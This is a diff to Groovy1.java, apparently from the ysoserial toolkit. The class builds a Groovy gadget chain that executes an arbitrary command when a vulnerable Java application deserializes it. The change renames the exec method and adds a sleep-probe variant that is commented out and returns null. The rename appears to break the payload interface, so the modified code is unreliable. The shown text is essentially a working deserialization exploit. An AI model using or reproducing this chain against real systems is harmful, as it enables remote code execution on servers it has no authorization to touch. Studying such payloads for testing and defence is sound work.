@@ -29,14 +29,27 @@ import ysoserial.payloads.util.PayloadRunner;
 @Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
 public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
-	public InvocationHandler getObject(final String command) throws Exception {
+	public InvocationHandler getObjectExec(final String command) throws Exception {
 		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
-		
+				
 		final Map map = Gadgets.createProxy(closure, Map.class);		
-
+		
 		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
 		
 		return handler;
+	}	
+	
+	public InvocationHandler getObjectSleep(final String command) throws Exception {
+		/*
+		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(java.lang.Thread.class, "sleep"), "entrySet");
+		
+		final Map map = Gadgets.createProxy(closure, Map.class);		
+		
+		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
+		
+		return handler;
+		*/
+		return null;
 	}
 
 	public static void main(final String[] args) throws Exception {
